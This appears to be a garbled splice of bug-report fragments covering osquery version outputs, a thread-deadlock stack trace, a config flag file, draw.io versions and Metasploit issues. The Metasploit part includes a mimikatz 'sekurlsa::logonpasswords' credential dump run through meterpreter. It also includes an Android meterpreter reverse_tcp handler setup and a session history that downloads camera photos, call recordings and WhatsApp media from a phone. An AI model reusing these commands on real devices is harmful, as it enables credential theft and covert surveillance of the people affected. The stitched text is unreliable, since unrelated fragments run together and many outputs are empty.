i1008 18:30:17.858249 3444 database.cpp:563] checking database version for migration
i1008 18:30:17.858249 3444 database.cpp:587] performing migration: 0 -> 1
i1008 18:30:17.858249 3444 database.cpp:619] migration 0 -> 1 successfully completed!
i1008 18:30:17.858249 3444 database.cpp:587] performing migration: 1 -> 2
i1008 18:30:17.858249 3444 database.cpp:619] migration 1 -> 2 successfully completed! version = 6.3.9600 build = 9600
platform = windows
+----------+-------+----------+
| version | build | platform |
+----------+-------+----------+
| 6.1.7601 | 7601 | windows |
+----------+-------+----------+
*this also works on windows 10 1803 and windows 10 1709, i assume it works on all other windows versions as vell.
version = 10.0.16299 build = 16299
platform = windows
**controller information:** model name: apple t2 chip firmware version: 15p6805 ```
osqueryi --line "select version, build, platform from os_version;" version = 10.13.6 build = 17g2307
platform = darwin
windows 10 1803 (july), enterprise, brand new vm (vmware workstation 14 pro, 14.1.3 build-9474260) <!-- osqueryi --line "select version, build, platform from os_version;"
macos and linux
macos 10.13.6 (17g65)
version = centos linux release 7.5.1804 (core) build = platform = rhel
distributor id: ubuntu
description: ubuntu 18.04.1 lts
release: 18.04
codename: bionic
macos 10.13.6 (17g65)
affects all oses.
osquery master (7627af388d3d66d9bc1d73a17596f490dc8ff1a1)
ps c:\\users\ icholas> version = 4.5.1
+---------------------------+
| version |
+---------------------------+
| 4.4.0-48-gc7e37c2a0-dirty |
+---------------------------+
4.4 (custom built with windows_eventlog table support)
version = 4.4.0
+---------+
| version |
+---------+
+---------+
### description i found an interesting scenario where osquery ended up deadlocked while removing an extension and running a query i have two stacks for the threads involved: ```
ntdll!ntwaitforsingleobject+
kernelbase!waitforsingleobjectex+
osqueryd!boost::shared_mutex::lock_shared+ [c:\\basefolder\\osquery\\cmakex64\\libraries\\boost\\include\\boost\\thread\\win32\\shared_mutex.hpp @ 183]
osqueryd!boost::shared_lock<boost::shared_mutex>::lock+ [c:\\basefolder\\osquery\\cmakex64\\libraries\\boost\\include\\boost\\thread\\lock_types.hpp @ 645]
osqueryd!boost::shared_lock<boost::shared_mutex>::{ctor}+ [c:\\basefolder\\osquery\\cmakex64\\libraries\\boost\\include\\boost\\thread\\lock_types.hpp @ 520]
osqueryd!osquery::registryinterface::exists+ [c:\\basefolder\\osquery\\osquery\ egistry\ egistry_interface.cpp @ 302]
osqueryd!osquery::registryfactory::exists+ [c:\\basefolder\\osquery\\osquery\ egistry\ egistry_factory.cpp @ 239]
osqueryd!osquery::tables::sqlite::xfilter+ [c:\\basefolder\\osquery\\osquery\\sql\\virtual_table.cpp @ 986]
osqueryd!sqlite3vdbeexec+ [c:\\basefolder\\osquery\\cmakex64\\libraries\\sqlite\\source\\sqlite3.c @ 92160]
osqueryd!sqlite3step+ [c:\\basefolder\\osquery\\cmakex64\\libraries\\sqlite\\source\\sqlite3.c @ 83211]
osqueryd!sqlite3_step+ [c:\\basefolder\\osquery\\cmakex64\\libraries\\sqlite\\source\\sqlite3.c @ 83276]
osqueryd!osquery::readrows+ [c:\\basefolder\\osquery\\osquery\\sql\\sqlite_util.cpp @ 606]
osqueryd!osquery::queryinternal+ [c:\\basefolder\\osquery\\osquery\\sql\\sqlite_util.cpp @ 649]
osqueryd!osquery::sqlinternal::sqlinternal+ [c:\\basefolder\\osquery\\osquery\\sql\\sqlite_util.cpp @ 185]
osqueryd!osquery::monitor+ [c:\\basefolder\\osquery\\osquery\\dispatcher\\scheduler.cpp @ 78]
osqueryd!osquery::launchquery+ [c:\\basefolder\\osquery\\osquery\\dispatcher\\scheduler.cpp @ 99]
osqueryd!<lambda_edf08e247f5ba2a401affff265369e64>::operator()+ [c:\\basefolder\\osquery\\osquery\\dispatcher\\scheduler.cpp @ 179]
osqueryd!std::_func_class<void,std::basic_string<char,std::char_traits<char>,std::allocator<char> >,osquery::scheduledquery const &>::operator()+ [c:\\program files (x86)\\microsoft visual studio\\2017\\professional\\vc\\tools\\msvc\\14.16.27023\\include\\functional @ 16707566]
osqueryd!osquery::config::scheduledqueries+ [c:\\basefolder\\osquery\\osquery\\config\\config.cpp @ 462]
osqueryd!osquery::schedulerrunner::start+ [c:\\basefolder\\osquery\\osquery\\dispatcher\\scheduler.cpp @ 191]
osqueryd!osquery::internalrunnable::run+ [c:\\basefolder\\osquery\\osquery\\dispatcher\\dispatcher.cpp @ 48]
osqueryd!std::_invoker_pmf_pointer::_call+ [c:\\program files (x86)\\microsoft visual studio\\2017\\professional\\vc\\tools\\msvc\\14.16.27023\\include\\type_traits @ 16707566]
osqueryd!std::invoke+ [c:\\program files (x86)\\microsoft visual studio\\2017\\professional\\vc\\tools\\msvc\\14.16.27023\\include\\type_traits @ 16707566]
osqueryd!std::_invoker_ret<std::_unforced,0>::_call+ [c:\\program files (x86)\\microsoft visual studio\\2017\\professional\\vc\\tools\\msvc\\14.16.27023\\include\\type_traits @ 16707566]
osqueryd!std::_call_binder+ [c:\\program files (x86)\\microsoft visual studio\\2017\\professional\\vc\\tools\\msvc\\14.16.27023\\include\\functional @ 1858]
osqueryd!std::_binder<std::_unforced,void (__cdecl osquery::internalrunnable::*)(void),osquery::internalrunnable *>::operator()+ [c:\\program files (x86)\\microsoft visual studio\\2017\\professional\\vc\\tools\\msvc\\14.16.27023\\include\\functional @ 1914]
osqueryd!std::_invoker_functor::_call+ [c:\\program files (x86)\\microsoft visual studio\\2017\\professional\\vc\\tools\\msvc\\14.16.27023\\include\\type_traits @ 16707566]
osqueryd!std::invoke+ [c:\\program files (x86)\\microsoft visual studio\\2017\\professional\\vc\\tools\\msvc\\14.16.27023\\include\\type_traits @ 16707566]
osqueryd!std::_launchpad<std::unique_ptr<std::tuple<std::_binder<std::_unforced,void (__cdecl osquery::internalrunnable::*)(void),osquery::internalrunnable *> >,std::default_delete<std::tuple<std::_binder<std::_unforced,void (__cdecl osquery::internalrunnable::*)(void),osquery::internalrunnable *> > > > >::_execute+ [c:\\program files (x86)\\microsoft visual studio\\2017\\professional\\vc\\tools\\msvc\\14.16.27023\\include\\thr\\xthread @ 238]
osqueryd!std::_launchpad<std::unique_ptr<std::tuple<std::_binder<std::_unforced,void (__cdecl osquery::internalrunnable::*)(void),osquery::internalrunnable *> >,std::default_delete<std::tuple<std::_binder<std::_unforced,void (__cdecl osquery::internalrunnable::*)(void),osquery::internalrunnable *> > > > >::_run+ [c:\\program files (x86)\\microsoft visual studio\\2017\\professional\\vc\\tools\\msvc\\14.16.27023\\include\\thr\\xthread @ 245]
osqueryd!std::_launchpad<std::unique_ptr<std::tuple<std::_binder<std::_unforced,void (__cdecl osquery::internalrunnable::*)(void),osquery::internalrunnable *> >,std::default_delete<std::tuple<std::_binder<std::_unforced,void (__cdecl osquery::internalrunnable::*)(void),osquery::internalrunnable *> > > > >::_go+ [c:\\program files (x86)\\microsoft visual studio\\2017\\professional\\vc\\tools\\msvc\\14.16.27023\\include\\thr\\xthread @ 230]
osqueryd!std::_pad::_call_func+ [c:\\program files (x86)\\microsoft visual studio\\2017\\enterprise\\vc\\tools\\msvc\\14.16.27023\\include\\thr\\xthread @ 209]
osqueryd!invoke_thread_procedure+ [minkernel\\crts\\ucrt\\src\\appcrt\\startup\\thread.cpp @ 91]
osqueryd!thread_start<unsigned int (__cdecl*)(void * __ptr64)>+ [minkernel\\crts\\ucrt\\src\\appcrt\\startup\\thread.cpp @ 115]
kernel32!basethreadinitthunk+
ntdll!rtluserthreadstart+
ntdll!ntwaitforsingleobject+
kernelbase!waitforsingleobjectex+
osqueryd!boost::detail::basic_timed_mutex::lock+ [c:\\basefolder\\osquery\\cmakex64\\libraries\\boost\\include\\boost\\thread\\win32\\basic_timed_mutex.hpp @ 85]
osqueryd!boost::detail::basic_recursive_mutex_impl<boost::detail::basic_timed_mutex>::lock+ [c:\\basefolder\\osquery\\cmakex64\\libraries\\boost\\include\\boost\\thread\\win32\\basic_recursive_mutex.hpp @ 56]
osqueryd!boost::unique_lock<boost::recursive_mutex>::lock+ [c:\\basefolder\\osquery\\cmakex64\\libraries\\boost\\include\\boost\\thread\\lock_types.hpp @ 346]
osqueryd!boost::unique_lock<boost::recursive_mutex>::{ctor}+ [c:\\basefolder\\osquery\\cmakex64\\libraries\\boost\\include\\boost\\thread\\lock_types.hpp @ 124]
osqueryd!osquery::sqlitedbinstance::attachlock+ [c:\\basefolder\\osquery\\osquery\\sql\\sqlite_util.cpp @ 309]
osqueryd!osquery::detachtableinternal+ [c:\\basefolder\\osquery\\osquery\\sql\\virtual_table.cpp @ 1104]
osqueryd!osquery::sqlitesqlplugin::detach+ [c:\\basefolder\\osquery\\osquery\\sql\\sqlite_util.cpp @ 258]
osqueryd!osquery::sqlplugin::call+ [c:\\basefolder\\osquery\\osquery\\sql\\sql.cpp @ 161]
osqueryd!osquery::registryinterface::call+ [c:\\basefolder\\osquery\\osquery\ egistry\ egistry_interface.cpp @ 144]
osqueryd!osquery::registryfactory::call+ [c:\\basefolder\\osquery\\osquery\ egistry\ egistry_factory.cpp @ 176]
osqueryd!osquery::registryfactory::call+ [c:\\basefolder\\osquery\\osquery\ egistry\ egistry_factory.cpp @ 199]
osqueryd!osquery::tableplugin::removeexternal+ [c:\\basefolder\\osquery\\osquery\\core\\tables.cpp @ 55]
osqueryd!osquery::registryinterface::removeexternal+ [c:\\basefolder\\osquery\\osquery\ egistry\ egistry_interface.cpp @ 289]
osqueryd!osquery::registryfactory::removebroadcast+ [c:\\basefolder\\osquery\\osquery\ egistry\ egistry_factory.cpp @ 133]
osqueryd!osquery::extensionmanagerwatcher::watch+ [c:\\basefolder\\osquery\\osquery\\extensions\\extensions.cpp @ 342]
osqueryd!osquery::extensionmanagerwatcher::start+ [c:\\basefolder\\osquery\\osquery\\extensions\\extensions.cpp @ 226]
osqueryd!osquery::internalrunnable::run+ [c:\\basefolder\\osquery\\osquery\\dispatcher\\dispatcher.cpp @ 48]
osqueryd!std::_invoker_pmf_pointer::_call+ [c:\\program files (x86)\\microsoft visual studio\\2017\\professional\\vc\\tools\\msvc\\14.16.27023\\include\\type_traits @ 16707566]
osqueryd!std::invoke+ [c:\\program files (x86)\\microsoft visual studio\\2017\\professional\\vc\\tools\\msvc\\14.16.27023\\include\\type_traits @ 16707566]
osqueryd!std::_invoker_ret<std::_unforced,0>::_call+ [c:\\program files (x86)\\microsoft visual studio\\2017\\professional\\vc\\tools\\msvc\\14.16.27023\\include\\type_traits @ 16707566]
osqueryd!std::_call_binder+ [c:\\program files (x86)\\microsoft visual studio\\2017\\professional\\vc\\tools\\msvc\\14.16.27023\\include\\functional @ 1858]
osqueryd!std::_binder<std::_unforced,void (__cdecl osquery::internalrunnable::*)(void),osquery::internalrunnable *>::operator()+ [c:\\program files (x86)\\microsoft visual studio\\2017\\professional\\vc\\tools\\msvc\\14.16.27023\\include\\functional @ 1914]
osqueryd!std::_invoker_functor::_call+ [c:\\program files (x86)\\microsoft visual studio\\2017\\professional\\vc\\tools\\msvc\\14.16.27023\\include\\type_traits @ 16707566]
osqueryd!std::invoke+ [c:\\program files (x86)\\microsoft visual studio\\2017\\professional\\vc\\tools\\msvc\\14.16.27023\\include\\type_traits @ 16707566]
osqueryd!std::_launchpad<std::unique_ptr<std::tuple<std::_binder<std::_unforced,void (__cdecl osquery::internalrunnable::*)(void),osquery::internalrunnable *> >,std::default_delete<std::tuple<std::_binder<std::_unforced,void (__cdecl osquery::internalrunnable::*)(void),osquery::internalrunnable *> > > > >::_execute+ [c:\\program files (x86)\\microsoft visual studio\\2017\\professional\\vc\\tools\\msvc\\14.16.27023\\include\\thr\\xthread @ 238]
osqueryd!std::_launchpad<std::unique_ptr<std::tuple<std::_binder<std::_unforced,void (__cdecl osquery::internalrunnable::*)(void),osquery::internalrunnable *> >,std::default_delete<std::tuple<std::_binder<std::_unforced,void (__cdecl osquery::internalrunnable::*)(void),osquery::internalrunnable *> > > > >::_run+ [c:\\program files (x86)\\microsoft visual studio\\2017\\professional\\vc\\tools\\msvc\\14.16.27023\\include\\thr\\xthread @ 245]
osqueryd!std::_launchpad<std::unique_ptr<std::tuple<std::_binder<std::_unforced,void (__cdecl osquery::internalrunnable::*)(void),osquery::internalrunnable *> >,std::default_delete<std::tuple<std::_binder<std::_unforced,void (__cdecl osquery::internalrunnable::*)(void),osquery::internalrunnable *> > > > >::_go+ [c:\\program files (x86)\\microsoft visual studio\\2017\\professional\\vc\\tools\\msvc\\14.16.27023\\include\\thr\\xthread @ 230]
osqueryd!std::_pad::_call_func+ [c:\\program files (x86)\\microsoft visual studio\\2017\\enterprise\\vc\\tools\\msvc\\14.16.27023\\include\\thr\\xthread @ 209]
osqueryd!invoke_thread_procedure+ [minkernel\\crts\\ucrt\\src\\appcrt\\startup\\thread.cpp @ 91]
osqueryd!thread_start<unsigned int (__cdecl*)(void * __ptr64)>+ [minkernel\\crts\\ucrt\\src\\appcrt\\startup\\thread.cpp @ 115]
kernel32!basethreadinitthunk+
ntdll!rtluserthreadstart+
so thread 174 calls removeexternal when the extension goes away
this locks the mutex around the registryinterface class:
#l280
thread 1704 executes a query around the same time and this acquires a lock around the sql db instance:
#l635 3
thread 174 then proceeds to attempt detach the sql instances of the registered extension trying to use the now locked sql db instance:
#l1105
thread 1704 attempts to check if a table exists while running a query and attempts to acquire the lock around the registryinterface class:
#l302 we now have thread 174 waiting for the sql db instance to be freed while locking the registryinterface and thread 1704 locking the sql db instance while waiting for the registryinterface
looking at the more recent code changes around this i can see: adds a writelock around the entire removeexternal
could we revert this to just use read and write mutexs around the relevant calls again? this way the call to detachtableinternal we will no longer be guarded by the registryinterface while waiting for the sql db instance mutex to unlock removing condition 3: 1
so thread 174 calls removeexternal when the extension goes away
this locks the mutex around the registryinterface class:
#l280
thread 1704 executes a query around the same time and this acquires a lock around the sql db instance:
#l635 3
~~thread 174 then proceeds to attempt detach the sql instances of the registered extension trying to use the now locked sql db instance:~~
#l1105
thread 1704 attempts to check if a table exists while running a query and attempts to acquire the lock around the registryinterface class:
#l302
+---------+
| version |
+---------+
+---------+
### description convertstringsidtosid is used in a number of tables: * #l86 * #l203 * #l201 the windows api documentation says the sid should be free after use:
building current `git clone`.
``` +---------+
| version |
+---------+ | 4.3.0 |
+---------+
+---------+
| version |
+---------+
+---------+
version = 4.3.0
osqueryd --version
osqueryd version 3.3.2-179-g5e98095_20.04.0003.0301
``` ``` text i0524 11:37:05.835503 43226 database.cpp:563] checking database version for migration
i0524 11:37:09.177484 43226 config.cpp:738] update
e0524 11:37:09.177896 43226 init.cpp:593] cannot activate filesystem logger plugin: could not create file: /var/log/osquery/osqueryd.results.log ```
version = 4.3.0 (and older)
4.2.0 (this also occurs on 4.1.1) installed from **edit:** pkg.osquery.io/deb repo
this did not occur on 4.0.2 and earlier.
$ osqueryi --line "select version from osquery_info;"
version = 4.2.0
$ osqueryi --line "select version from osquery_info;"
version = 4.1.2
`version = 4.2.0`
version = 4.2.0
tested 4.2.0 and a few earlier versions
# w0308 13:36:22.913404 61721 options.cpp:91] cannot set unknown or invalid flag: enable_monitor
version = 4.2.0
this issue exists in osquery 4.1.2 and 4.2.0
4.0.2 does not have the issue.
```
[tferguson-lt] c:\\users\\tferguson\\desktop>osqueryi420.exe "select version from osquery_info;"
+---------+
| version |
+---------+
+---------+
+---------+
| version |
+---------+
+---------+
the bug occurred in versions:
+---------+
| version |
+---------+
+---------+
+---------+
+---------+
+---------+
the latest version that the bug does **not** occure is:
+---------+
| version |
+---------+
+---------+
this bug looks to impact versions of osquery >= 2.10.0 through 4.1.2
$ apt-cache show osquery | head -n20
architecture: amd64
depends: libc6 (>=2.12), zlib1g
description: osquery is an operating system instrumentation toolchain.
description-md5: 2a4e0eb035860a3cbfe12237817e68c5
homepage:
maintainer: osquery@osquery.io
package: osquery
priority: extra
section: default
version: 4.1.2-1.linux
installed-size: 54239
filename: pool/deb/main/o/osquery/osquery_4.1.2-1.linux_amd64.deb
md5sum: cc1064ec6fd9cb4c90d3cc91f062233b
sha1: d6474b01dbdc47bf15bb82e349710e4328d16144
sha256: 87fb9019dc7469baf4beb74ae9267bb2cf4855d943d089db1b4addf22974a076
sha512: f3beda39a92ce08128f3e3a6b0ff9605453cc7ec03cf4f7badc9308f3f2593b891b1ed1d9b9de465cf3a35e3871286b0bc294bd071491bbfa7a21746773980a9
size: 9705630
osquery version - 4.1.2
**osquery 4.0.1** _(confirmed works)_ **osquery 4.1.1**
osquery 4.1.1 / 4.0.2
osquery> select version from osquery_info; version = 4.1.1 ```
version = 4.0.2
version = 4.0.2
version = 4.0.2
4.0.2 (breakage is between 3.x and 4.x)
version = 4.0.2
4.02 and any earlier version(s)
```
osquery> select version from osquery_info;
version = 4.0.2-44-g6ba37014
osqueryi 3.3.2 (shell only)
4.0.2 (official packages)
version = 4.0.2-2-g65aca42e
osquery master
shell version: 3.3.2
shell version: 3.3.2
the code has not been changed in experimental, so this is most likely still an issue.
osquery v3.4.0
3.3.2, and this example was run in the user context
you can run the line below
paste the result within a code block
osqueryi --line "select * from chrome_extensions;"
```osquery> select * from chrome_extensions;
osquery> select * from chrome_extensions;
+------+----------------------+----------------------------------+-------------+---------------------------------------------------------+--------+-------------------------------------------------+--------+------------+--------------------------------------------------------------------------------------------------------------------------+-------------------------------------------------------------------------------+
| uid | name | identifier | version | description | locale | update_url | author | persistent | path | permissions |
+------+----------------------+----------------------------------+-------------+---------------------------------------------------------+--------+-------------------------------------------------+--------+------------+--------------------------------------------------------------------------------------------------------------------------+-------------------------------------------------------------------------------+
| 1001 | grammarly for chrome | kbfnbcaeplbcioakkpcpgfkobkghlhen | 14.903.2151 | enhance your written communication everywhere you type! | | | | 0 | c:\\users\\xxxse\\appdata\\local\\google\\chrome\\user data\\default\\extensions\\kbfnbcaeplbcioakkpcpgfkobkghlhen\\14.903.2151_0\\ | <all_urls>, tabs, notifications, cookies, system.cpu, clipboardwrite, storage |
+------+----------------------+----------------------------------+-------------+---------------------------------------------------------+--------+-------------------------------------------------+--------+------------+--------------------------------------------------------------------------------------------------------------------------+-------------------------------------------------------------------------------+
osquery> select * from chrome_extensions;
+------+---------------------------+----------------------------------+-------------+-------------------------------------------------------------------+--------+-------------------------------------------------+--------+------------+--------------------------------------------------------------------------------------------------------------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| uid | name | identifier | version | description | locale | update_url | author | persistent | path | permissions |
+------+---------------------------+----------------------------------+-------------+-------------------------------------------------------------------+--------+-------------------------------------------------+--------+------------+--------------------------------------------------------------------------------------------------------------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 1001 | slides | aapocclcgogkmnckokdopfmhonfmgoek | 0.10 | create and edit presentations | en_us | | | 0 | c:\\users\\xxxse\\appdata\\local\\google\\chrome\\user data\\default\\extensions\\aapocclcgogkmnckokdopfmhonfmgoek\\0.10_0\\ | |
| 1001 | docs | aohghmighlieiainnegkcijnfilokake | 0.10 | create and edit documents | en_us | | | 0 | c:\\users\\xxxse\\appdata\\local\\google\\chrome\\user data\\default\\extensions\\aohghmighlieiainnegkcijnfilokake\\0.10_0\\ | |
| 1001 | google drive | apdfllckaahabafndbhieahigkjlhalf | 14.1 | google drive: create, share and keep all your stuff in one place
| en_us | | | 0 | c:\\users\\xxxse\\appdata\\local\\google\\chrome\\user data\\default\\extensions\\apdfllckaahabafndbhieahigkjlhalf\\14.1_0\\ | background, clipboardread, clipboardwrite, notifications, unlimitedstorage |
| 1001 | youtube | blpcfgokakmgnkcojhhkbfbldkacnbeo | 4.2.8 | | en | | | 0 | c:\\users\\xxxse\\appdata\\local\\google\\chrome\\user data\\default\\extensions\\blpcfgokakmgnkcojhhkbfbldkacnbeo\\4.2.8_0\\ | |
| 1001 | sheets | felcaaldnbdncclmgdcncolpebgiejap | 1.2 | create and edit spreadsheets | en_us | | | 0 | c:\\users\\xxxse\\appdata\\local\\google\\chrome\\user data\\default\\extensions\\felcaaldnbdncclmgdcncolpebgiejap\\1.2_0\\ | |
| 1001 | google docs offline | ghbmnnjooekpmoecnnnilnnbdlolhkhi | 1.7 | get things done offline with the google docs family of products
| en_us | | | 0 | c:\\users\\xxxse\\appdata\\local\\google\\chrome\\user data\\default\\extensions\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\1.7_0\\ | alarms, clipboardread, clipboardwrite, identity, power, storage, unlimitedstorage |
| 1001 | grammarly for chrome | kbfnbcaeplbcioakkpcpgfkobkghlhen | 14.903.2151 | enhance your written communication everywhere you type! | | | | 0 | c:\\users\\xxxse\\appdata\\local\\google\\chrome\\user data\\default\\extensions\\kbfnbcaeplbcioakkpcpgfkobkghlhen\\14.903.2151_0\\ | <all_urls>, tabs, notifications, cookies, system.cpu, clipboardwrite, storage |
| 1001 | chrome web store payments | nmmhkkegccagdldgiimedpiccmgmieda | 1.0.0.4 | chrome web store payments | en | | | 0 | c:\\users\\xxxse\\appdata\\local\\google\\chrome\\user data\\default\\extensions\ mmhkkegccagdldgiimedpiccmgmieda\\1.0.0.4_0\\ | identity, webview, |
| 1001 | gmail | pjkljhegncpnkpknbcohdijeoejaedia | 8.1 | fast, searchable email with less spam
| en | | | 0 | c:\\users\\xxxse\\appdata\\local\\google\\chrome\\user data\\default\\extensions\\pjkljhegncpnkpknbcohdijeoejaedia\\8.1_0\\ | notifications |
+------+---------------------------+----------------------------------+-------------+-------------------------------------------------------------------+--------+-------------------------------------------------+--------+------------+--------------------------------------------------------------------------------------------------------------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
`version = 3.3.2`
`version = 3.3.2`
3.3.1 and 2.11.2
version = 3.3.1-1-g5188ce52
# osqueryi --line "select version from osquery_info;"
version = 3.3.0
c:\\programdata\\osquery\\osqueryd>
version = 3.3.1
# version = 3.3.0
3.3.1 (03148719)
3.2.4
> version = 3.3.0
``` flag file:
--audit_allow_config=true
--audit_allow_sockets=true
--audit_persist=true
--disable_audit=false
--disable_events=false
--events_expiry=1
--events_max=50000
--logger_plugin=kafka_producer,filesystem
--logger_path=/tmp/osquery.logs
--host_identifier=hostname
--config_plugin=tls
--config_tls_endpoint=/config
--config_tls_refresh=60
--config_tls_max_attempts=3
--enroll_tls_endpoint=/enroll
--enroll_secret_path=/etc/osquery/osquery.key
--disable_distributed=false
--distributed_plugin=tls
--distributed_interval=30
--distributed_tls_max_attempts=3
--distributed_tls_read_endpoint=/distributed/read
--distributed_tls_write_endpoint=/distributed/write
--tls_hostname=osquery-server:443
--tls_server_certs=/etc/osquery/certificate.crt
--pack_delimiter=/
--logger_kafka_brokers="xxx"
--logger_kafka_topic="security_osquery"
--logger_kafka_compression="gzip"
--logger_kafka_acks=1
--schedule_splay_percent=10
--logger_snapshot_event_type=true
```3.3.0```
3.3.0
version = 3.3.1-32-g28ffde72
c:\\programdata\\osquery\\osqueryi.exe --line "select version from osquery_info;"
i1008 18:30:19.049273 3344 database.cpp:563] checking database version for migration
i1008 18:30:19.049273 3344 database.cpp:587] performing migration: 0 -> 1
i1008 18:30:19.049273 3344 database.cpp:619] migration 0 -> 1 successfully completed!
i1008 18:30:19.049273 3344 database.cpp:587] performing migration: 1 -> 2
i1008 18:30:19.049273 3344 database.cpp:619] migration 1 -> 2 successfully completed!
version = 3.3.1
+---------+
| version |
+---------+
+---------+
on different machines
version = 3.3.0
issue is present on 3.2.6 and 3.3.0 ``` version = 3.3.0
3.3.0
built from master
version = 3.2.6
version = 3.3.0-40-gb0815c78
commit cf59b05
affects all versions.
kube 1.11 (yes, i know)
client: version v2.7.1
server: version "v2.7.2
- draw.io version 13.8.1
- draw.io version [e.g
13.5.7] desktop version
- draw.io version: 13.5.7
- draw.io version [13.1.2]
last online version (12.9.8)
- draw.io version 12.6.5
- draw.io version 12.6.5
- draw.io version 12.6.1
framework: 6.0.13-dev
console : 6.0.13-dev logs are clear
framework: 6.0.12-dev-1b28d21f0e2ed89e43a727a52516975cb7ebee6b
console : 6.0.12-dev-1b28d21f0e2ed89e43a727a52516975cb7ebee6b
msf6 auxiliary(gather/enum_dns) > version
framework: 6.0.14-dev-854c1905ca
console : 6.0.14-dev-854c1905ca
framework: 6.0.13-dev-65fcf67ca5
console : 6.0.13-dev-65fcf67ca5
framework: 5.0.101-dev
console : 5.0.101-dev
framework: 6.0.10-dev-
console : 6.0.10-dev-
6.0.10-dev-
framework: 6.0.11-dev-1b6879cc6b
console : 6.0.11-dev-1b6879cc6b
framework: 5.0.101-dev
console : 5.0.101-dev
msf5 > version
framework: 5.0.101-dev
console : 5.0.101-dev
d0778c7a547a0f49fdea54463862306764675090 (head, upstream/master) land #14228, increase operations per run
d0778c7a547a0f49fdea54463862306764675090 (head, upstream/master) land #14228, increase operations per run
v6.0.9-dev-49d5d2abf8
ruby version 2.6.6p146
running inside a ubuntu linux 20.04 vm
framework: 5.0.101-dev
console: 5.0.101-dev
running on kali linux.
framework: 5.0.101-dev
console : 5.0.101-dev
`framework: 5.0.101-dev`
`console : 5.0.101-dev`
framework: 5.0.100-dev
console : 5.0.100-dev
21d9f06373267636d972e7ebdc0874ff336419d2 (grafted, head -> master, origin/master, origin/head) automatic module_metadata_base.json update the problem with these two commits( is that they don't take web_service into account for example, when i use the json_rpc, the #l41 will call the servlethelper's get_db method, then #l19, then #l195
the connection_established? is true at the moment, then #l18, at #l29, the activerecord::base.connected? will be nil, this is because of applicationrecord and activerecord in rails5, but the config is {} at the moment, so the will occur error
here is my log ```
[09/21/2020 23:12:01] [d(0)] core: already established connection to postgresql, so reusing active connection.
[09/21/2020 23:12:01] [e(0)] core: db.connect threw an exception - activerecord::adapternotspecified database configuration does not specify adapter
[09/21/2020 23:12:01] [e(0)] core: failed to connect to the database: database configuration does not specify adapter ```
`framework: 6.0.8-dev`
`console : 6.0.8-dev` docker image: `0946d77f5dbd` ```
./msfvenom --version
msfvenom: version unknown
``` source of acquisition:
`docker pull metasploitframework/metasploit-framework`
msf6 > version
framework: 6.0.7-dev-
console : 6.0.7-dev-
framework: 5.0.101-dev
1ce860a3715802998701e9538afe22feb6f1c29a (head -> master, origin/master, origin/head) land #14138, nexus_repo_manager_el_injection fix
`6.0.7-dev-` ### example output ```
meterpreter > kiwi_cmd "sekurlsa::logonpasswords full" authentication id : 0 ; 943489 (00000000:000e6581)
session : interactive from 1
user name : carter
domain : desktop-t2tgihp
logon server : desktop-t2tgihp
logon time : 9/11/2020 3:27:50 am
sid : s-1-5-21-919190163-669606871-1461497559-1003
authentication id : 0 ; 81336 (00000000:00013db8)
session : undefinedlogontype from 0
user name : (null)
domain : (null)
logon server : (null)
logon time : 9/11/2020 3:27:36 am
sid : msv : tspkg : wdigest : kerberos : ssp : credman : authentication id : 0 ; 999 (00000000:000003e7)
session : undefinedlogontype from 0
user name : desktop-t2tgihp$
domain : workgroup
logon server : (null)
logon time : 9/11/2020 3:27:36 am
sid : s-1-5-18 msv : tspkg : wdigest : * username : desktop-t2tgihp$ * domain : workgroup * password : (null) kerberos : * username : desktop-t2tgihp$ * domain : workgroup * password : (null) ssp : credman : mimikatz(powershell) # full
error mimikatz_dolocal ; "full" command of "standard" module not found ! module : standard
full name : standard module
description : basic commands (does not require module name) exit - quit mimikatz cls - clear screen (doesn't work with redirections, like psexec) answer - answer to the ultimate question of life, the universe, and everything coffee - please, make me a coffee! sleep - sleep an amount of milliseconds log - log mimikatz input/output to file base64 - switch file input/output base64 version - display some version informations cd - change or display current directory localtime - displays system local date and time (oj command) hostname - displays system local hostname ```
latest kali package:
framework: 5.0.101-dev
console : 5.0.101-dev
5.0.101-dev ### i installed metasploit with:
- [x] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os kali linux
6.0.5-dev-6a011fe1ee
framework: 6.0.5-dev
console : 6.0.5-dev
framework: 5.0.101-dev
console : 5.0.101-dev
framework: 6.0.5-dev-ce17c434ae6ba29f9facec3fc449ae109eda6f00
console : 6.0.5-dev-ce17c434ae6ba29f9facec3fc449ae109eda6f00
metasploit v5.0.101-dev ## module/datastore the following global/module datastore, and database setup was configured before the issue occurred:
<summary>collapse</summary> ```
[framework/ui/console]
activemodule=exploit/multi/handler [multi/handler]
payload=android/meterpreter/reverse_tcp
verbose=false
enablecontextencoding=false
contextinformationfile=
disablepayloadhandler=false
exitonsession=true
listenertimeout=0
lhost=192.168.1.2
``` </details> ## history the following commands were ran during the session and before this issue occurred:
<summary>collapse</summary> ```
181 cd sdcard
184 cd sdcard
187 cd dcim
190 download -h
192 background
194 sessions 2
195 download -a -c -l 5 -r *
196 cd camera
198 download -a -c -l 5 -r *
201 search -h
202 search -f *.jpg -r
203 search -f *.jpg -r -d /
209 cd callrecordings
210 cd gnwhatsapp
212 cd gbwhatsapp
214 download -h
215 download -c -r -l 5 media
216 download -c -r -l 5 media .
217 download -c -r -l 5 media/* .
218 download -c -r -l 5 media/* .
219 download -c -r -l 5 media/*
223 download -c -r -l 5 gbwhatsapp
224 download -c -r -l 5 gbwhatsapp/.
225 download -c -r -l 5 gbwhatsapp/*
226 cd download
229 set loglevel 3
``` </details> ## errors the following errors occurred before the issue occurred:
<summary>collapse</summary> ```
[09/06/2020 16:56:33] [e(0)] meterpreter: stdapi_fs_ls: operation failed: 1
[09/06/2020 16:56:36] [e(0)] meterpreter: stdapi_fs_ls: operation failed: 1
[09/06/2020 16:56:55] [e(0)] meterpreter: stdapi_fs_chdir: operation failed: 1
[09/06/2020 16:57:14] [e(0)] meterpreter: stdapi_fs_chdir: operation failed: 1
[09/06/2020 16:57:28] [e(0)] meterpreter: stdapi_fs_ls: operation failed: 1
[09/06/2020 16:58:07] [e(0)] meterpreter: stdapi_fs_ls: operation failed: 1
[09/06/2020 16:58:28] [e(0)] meterpreter: stdapi_fs_ls: operation failed: 1
